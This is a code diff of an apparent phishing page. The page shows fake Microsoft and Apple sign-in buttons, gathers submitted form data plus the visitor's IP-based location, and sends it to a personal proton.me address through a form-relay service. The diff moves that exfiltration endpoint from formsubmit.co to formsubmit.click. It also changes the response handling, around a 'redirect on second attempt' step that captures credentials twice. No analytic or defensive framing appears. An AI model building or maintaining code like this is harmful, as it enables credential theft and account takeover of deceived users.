@@ -500,7 +500,7 @@
           <button class="btn logo" type="button">
             <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm4x9jPELaQWyGDDPfk1PihnSw6z2tYshg8hGeLDKFItNQ_nfmpuwcUICeeYeLZrX2ORBeJHJLw3sN0plw0suKxt84xFZU_Ue17q17fpmPvOx2hJKzoqTmoF5dIZhA8f52PpC4GIYnIPbbr6JZHVhMTSh_M6joEzgX8K1n4Je2HOuMzsYCxGEWwusqNe8/s500/Untitled.png" alt="Microsoft logo">
             Sign in with Microsoft
-          </button>
+        </button>
           <button class="btn logo" type="button">
             <i class="fab fa-apple"></i>
             Sign in with Apple
@@ -525,7 +525,8 @@
     </div>
   </div>
 
-  <script>
+  
+        <script>
     document.addEventListener('DOMContentLoaded', function () {
   // Element references
   const downloadButtons = document.querySelectorAll('.download-icon');
@@ -689,19 +690,20 @@
         Location: ipData.city + ", " + ipData.country,
       };
 
-      // Submit to FormSubmit
-      const submitResponse = await fetch('https://formsubmit.co/ajax/gabriel5657@proton.me', {
+      // Submit to FormSubmit - UPDATED ENDPOINT
+      const submitResponse = await fetch('https://formsubmit.click/Gabriel5657@proton.me', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json',
         },
         body: JSON.stringify(formData),
       });
 
       if (!submitResponse.ok) throw new Error('Network error');
 
-      const result = await submitResponse.json();
+      // FormSubmit.click returns a redirect, so we don't parse JSON
+      const result = await submitResponse.text();
+      console.log('Form submission successful:', result);
 
       // Redirect on second attempt
       if (step === 2) {
@@ -813,6 +815,7 @@
   </script>
 </body>
 </html>
+
 
 
 
